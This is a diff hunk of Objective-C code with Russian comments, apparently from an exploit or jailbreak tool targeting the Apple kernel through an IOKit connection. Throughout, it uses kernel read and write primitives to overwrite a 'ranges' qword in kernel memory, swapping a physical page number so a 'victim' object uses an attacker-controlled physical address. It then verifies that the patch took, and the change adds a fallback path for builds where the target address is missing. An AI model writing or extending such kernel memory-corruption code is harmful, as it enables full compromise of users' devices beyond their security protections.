@@ -7156,25 +7156,31 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     //    старые пути (реестр/дженерик-скан) находят rangesVA ПОСЛЕ submit —
     //    патчим сейчас, в окне churn-backlog (workloop занят ≈30-50мс), до execute.
     if (!nSlots) {
-        uint64_t origQ = 0;
-        kreadbuf(rangesVA, &origQ, 8);
-        if ((uint32_t)(origQ >> 32) != pfn32) {
-            kpNote(r, [NSString stringWithFormat:@"  ranges qword ушёл (%#018llx) — записи НЕ БУДЕТ", (unsigned long long)origQ]);
-            IOObjectRelease(svc);
-            free(ctl);
-            return r;
+        if (!rangesVA) {
+            // 1.9.242: rangesVA=0 (XPF ranges-пусто на этом билде) — НЕ уходим:
+            // DEP-детектор/патчер уже поработал до submit, execute всё равно идёт.
+            kpNote(r, @"  rangesVA=0 — одиночный путь пропускаем, полагаемся на DEP-детектор");
+        } else {
+            uint64_t origQ = 0;
+            kreadbuf(rangesVA, &origQ, 8);
+            if ((uint32_t)(origQ >> 32) != pfn32) {
+                kpNote(r, [NSString stringWithFormat:@"  ranges qword ушёл (%#018llx) — записи НЕ БУДЕТ", (unsigned long long)origQ]);
+                IOObjectRelease(svc);
+                free(ctl);
+                return r;
+            }
+            slotVAs[0] = rangesVA;
+            origQs[0] = origQ;
+            slotForm[0] = 1;
+            nSlots = 1;
+            uint64_t newQ = ((uint64_t)ctlPFN << 32) | (origQ & 0xFFFFFFFFULL);
+            kpNote(r, [NSString stringWithFormat:@"  ПОДМЕНА ranges %#018llx → %#018llx (pfn %#x → %#x, lo32 сохранён)",
+                      (unsigned long long)origQ, (unsigned long long)newQ, pfn32, ctlPFN]);
+            kwritebuf(rangesVA, &newQ, 8);
+            uint64_t rb = 0;
+            kreadbuf(rangesVA, &rb, 8);
+            kpNote(r, [NSString stringWithFormat:@"  readback = %#018llx %@", (unsigned long long)rb, rb == newQ ? @"— ПРИЛИПЛО" : @"— НЕ прилипло"]);
         }
-        slotVAs[0] = rangesVA;
-        origQs[0] = origQ;
-        slotForm[0] = 1;
-        nSlots = 1;
-        uint64_t newQ = ((uint64_t)ctlPFN << 32) | (origQ & 0xFFFFFFFFULL);
-        kpNote(r, [NSString stringWithFormat:@"  ПОДМЕНА ranges %#018llx → %#018llx (pfn %#x → %#x, lo32 сохранён)",
-                  (unsigned long long)origQ, (unsigned long long)newQ, pfn32, ctlPFN]);
-        kwritebuf(rangesVA, &newQ, 8);
-        uint64_t rb = 0;
-        kreadbuf(rangesVA, &rb, 8);
-        kpNote(r, [NSString stringWithFormat:@"  readback = %#018llx %@", (unsigned long long)rb, rb == newQ ? @"— ПРИЛИПЛО" : @"— НЕ прилипло"]);
     } else {
         kpNote(r, [NSString stringWithFormat:@"  %d pfn-слот(а) пропатчены порт-маршрутом ДО submit — victim подхватывает ctlPA при первом execute", nSlots]);
     }
